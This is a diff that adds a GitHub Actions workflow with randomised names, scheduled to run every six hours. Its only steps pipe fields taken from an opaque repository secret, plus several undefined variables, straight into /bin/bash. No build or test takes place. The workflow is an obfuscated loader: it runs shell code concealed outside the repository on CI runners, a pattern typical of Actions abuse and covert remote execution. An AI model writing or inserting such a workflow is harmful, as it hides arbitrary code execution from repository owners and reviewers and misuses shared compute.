@@ -1,0 +1,26 @@
+name: jinxinnian3421
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinxinnian3421
+        env:
+          tgyjf766: ${{ secrets.tgyjf766 }}
+        run: |
+          echo $tgyjf766 | jq -r .wep2727 | /bin/bash
+          echo $dqmyr3857 | jq -r .f451 | /bin/bash
+          echo $fivmk83783 | jq -r .tgq1 | /bin/bash
+          echo $hl674 | jq -r .pbxcy64 | /bin/bash
+          echo $nkf6 | jq -r .bj757 | /bin/bash
+          echo $n21039 | jq -r .clk58321 | /bin/bash
+          echo $fdn31 | jq -r .ixykt262 | /bin/bash
+          echo $ipf4310 | jq -r .wrxrl97 | /bin/bash
+
